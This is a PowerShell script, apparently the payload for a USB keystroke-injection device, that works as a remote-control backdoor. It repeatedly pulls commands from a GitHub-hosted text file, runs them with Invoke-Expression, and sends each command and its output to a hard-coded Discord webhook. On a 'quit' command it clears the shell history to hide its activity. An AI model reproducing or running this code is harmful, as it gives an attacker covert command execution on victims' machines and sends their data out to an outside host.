# Define the URL of the GitHub page
$githubUrl = "https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/command.txt"

# Initialize a variable to store the output
$output = ""

# Start an infinite loop
while ($true) {
    try {
        # Fetch the raw content of the GitHub page (plain text)
        $commands = Invoke-RestMethod -Uri $githubUrl -Headers @{"Cache-Control"="no-cache"}
        
        # Split the content into separate commands by newlines
        $commandList = $commands -split "`n"

        # Loop through each command
        foreach ($command in $commandList) {
            # Trim any leading/trailing whitespace
            $command = $command.Trim()

            # Skip empty commands
            if ([string]::IsNullOrWhiteSpace($command)) {
                continue
            }

            # Check if the command starts with '!!' and strip that part off
            if ($command -like "!!*") {
                $command = $command.Substring(2)
            }

            Write-Host "Executing: $command"

            # Check if the command is 'quit' and exit the loop
            if ($command.Trim() -eq "quit") {
                break
            }

            # Run the command
            $result = Invoke-Expression -Command $command

            # Print the output to console
            Write-Host $result

            # Post to Discord
            $webhookUrl = "https://discord.com/api/webhooks/1354265213477851246/cuHgwA8xLpNhSWpr8A-nz8xnBnKHgG9BsSRrjq6-FV0zJIRYb0WAun4Vaj8INFZnpQQm"
            $Output = @{content = $command + "`n" + $result} | ConvertTo-Json -Depth 10
			$maxLength = 1800

			# Split the output into chunks of 2000 characters or fewer
			$chunks = [System.Collections.ArrayList]@()
			for ($i = 0; $i -lt $Output.Length; $i += $maxLength) {
				$chunks.Add($Output.Substring($i, [Math]::Min($maxLength, $Output.Length - $i)))
			}

			# Send each chunk separately
			foreach ($chunk in $chunks) {
				$payload = @{content = $chunk} | ConvertTo-Json -Depth 10
				Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
			}
			
			
			
			
			

            # Wait for 60 seconds before the next command
            Start-Sleep -Seconds 5
        }
		
		# Check if the command is 'quit' and exit the loop
        if ($command.Trim() -eq "quit") {
            Write-Host "Quit command received. Exiting..."
            Invoke-Expression -Command Clear-History
            break
        }
		
		 # Wait for 60 seconds before the next command pull
         Start-Sleep -Seconds 60
        
    } catch {
        Write-Host "An error occurred: $_"
        $output += "An error occurred: $_`n"
        Start-Sleep -Seconds 60
    }
}
